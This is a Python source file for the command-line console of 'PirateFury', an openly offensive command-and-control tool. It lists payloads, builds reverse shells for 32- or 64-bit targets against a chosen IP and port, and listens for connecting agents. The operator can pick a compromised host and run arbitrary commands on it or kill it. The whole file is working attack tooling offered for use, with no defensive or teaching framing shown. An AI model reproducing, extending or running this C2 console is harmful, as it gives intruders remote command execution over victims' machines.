import cmd
import os
from tabulate import tabulate
from modules.CORE import C2core
from modules.server import server
from modules.agent import agent


class PirateFury(cmd.Cmd):
    prompt = "$PirateFury-> "
    doc_header = "Use help <command> for more information."
    core = C2core()
    payloads = core.ListAll("payloads")
    CurrentPayload = None


    def preloop(self):
        "preloop checker\n"
        null = 0
        settings = self.core.ListAll("settings")
        for attr in settings.keys():
            if settings[attr] is None:
                print(f"[!] {attr.upper()} is null")
                null += 1

        if null != 0:
            print("\n[+] use the set command to update the null attributes before starting.")

    def default(self, arg):
        print("[*] Invalid command, use help for information.")

    def do_exit(self, arg):
        "exit the CLI.\n"
        exit(0)

    def do_clear(self, arg):
        "clear the stdout.\n"
        if os.name == 'nt':
            _ = os.system('cls')
        else:
            _ = os.system('clear')

    def do_set(self, arg):
        "set attributes\nusage: set <attribute> <value>\n"
        args = arg.split(" ")
        if len(args) != 2:
            print("[*] Missing parameters.")
            return
        if args[0].lower() == "payload":
            self.CurrentPayload = args[1]
            return
        try:
            self.core.SetAttributes(args[0], args[1])
        except ValueError:
            print("[!] Invalid Value")
        except TypeError:
            print("[!] the attribute doesn't exists")

    def do_show(self, arg):
        "show the available payloads or the current settings.\n"
        args = arg.split(" ")
        if args[0].lower() == "settings":
            settings = self.core.ListAll("settings")
            for attr in settings.keys():
                if settings[attr] is None:
                    print(f"[+] {attr} = null")
                else:
                    print(f"[+] {attr} = {settings[attr]}")
            print()
        elif args[0].lower() == "payloads":
            payloads = self.core.ListAll("payloads")
            TableData = []
            for platform, files in payloads.items():
                for FileInfo in files:
                    TableData.append([platform, FileInfo["path"], FileInfo["Type"]])
            print(tabulate(TableData, headers=["Platform", "Path", "Type"], tablefmt="grid"))
        else:
            print("[*] Invalid option, use \"show settings\" for displaying current settings and \"show payloads\" for the available payloads.")

    def do_save(self, arg):
        "save the setting file, will save settings to settings.json if no file name were given.\n"
        args = arg.split(" ")
        if len(args) != 1:
            print("[*] Invalid parameters.")
            return
        try:
            if len(args[0]) == 0:
                self.core.settings("save")
            else:
                if not self.core.settings("save", args[0]):
                    print("[*] Invalid file name, it must have json extention.")
                    return
            print("Done.")
        except FileExistsError:
            status = input("File name already exists. Do you want to overwrite the file? (y or n): ")

            while status.lower() not in ['y', 'n']:
                print("Invalid input. Please enter 'y' or 'n'.")
                status = input("File name already exists. Do you want to overwrite the file? (y or n): ")

            if status.lower() == 'y':
                try:
                    if len(args[0]) == 0:
                        os.remove("settings.json")
                    else:
                        os.remove(args[0])

                    if len(args[0]) == 0:
                        self.core.settings("save")
                    else:
                        self.core.settings("save", args[0])
                except Exception as e:
                    print(e)

    def do_load(self, arg):
        "load the setting file, will load settings from settings.json if no file name were given.\n"
        args = arg.split(" ")
        if len(args) == 1:
            try:
                if len(args[0]) == 0:
                    self.core.settings("load")
                else:
                    self.core.settings("load", args[0])
                print("Done.")
            except FileNotFoundError:
                print("[!] File not found.")
        else:
            print("[*] Invalid parameters.")

    def do_build(self, arg):
        "build the reverse shell, set up ip and port and payload before building.\n"
        args = arg.split(" ")
        if len(args) < 1 and len(args[0]) == 0:
            print("[*] Missing parameters")
            return
        elif len(args) > 2:
            print("[*] Invalid parameters.")
            return
        elif self.CurrentPayload is None:
            print("[*] No payload has been selected.")
            return

        if args[0] in ["64", "32"]:
            if len(args) == 1:
                output = self.core.compile(args[0], self.CurrentPayload)
            else:
                output = self.core.compile(args[0], self.CurrentPayload, args[1])
            print(output)
        else:
            print("[*] Invalid architecture.")

    def do_listen(self, arg):
        "Listen for upcoming connections.\n"
        NullAttr = self.core.CheckAttributes()
        for attr in ["ip", "port"]:
            if attr in NullAttr:
                print(f"[*] Missing attributes {attr}.")
                return
        settings = self.core.ListAll("settings")
        serv = server(settings["ip"], settings["port"])
        connections = serv.GetConnections(5)
        AgentsTable = [(i+1, agent) for i, agent in enumerate(connections)]

        print(tabulate(AgentsTable, headers=["Agents", "Agent Info"], tablefmt="grid"))

        while True:
            try:
                num = int(input("Pick an agent by number: "))
                if num > len(connections) or num < 0:
                    raise ValueError
                break
            except ValueError:
                print("Invalid input. Please enter a valid agent number.")

        agen = agent(connections[num - 1])
        while True:
            cmd = input(f"Agent {num}-> ")
            if cmd == "exit":
                break
            elif cmd == "kill":
                agen.kill()
                break
            elif cmd == "clear":
                self.do_clear()
            else:
                output = agen.ExecCmd(cmd)
                print(output)


if __name__ == '__main__':
    try:
        print("""
______ _           _      ______                
| ___ (_)         | |     |  ___|               
| |_/ /_ _ __ __ _| |_ ___| |_ _   _ _ __ _   _ 
|  __/| | '__/ _` | __/ _ \  _| | | | '__| | | |
| |   | | | | (_| | ||  __/ | | |_| | |  | |_| |
\_|   |_|_|  \__,_|\__\___\_|  \__,_|_|   \__, |
                                           __/ |
                                          |___/ """)
        PirateFury().cmdloop()
    except KeyboardInterrupt:
        exit(0)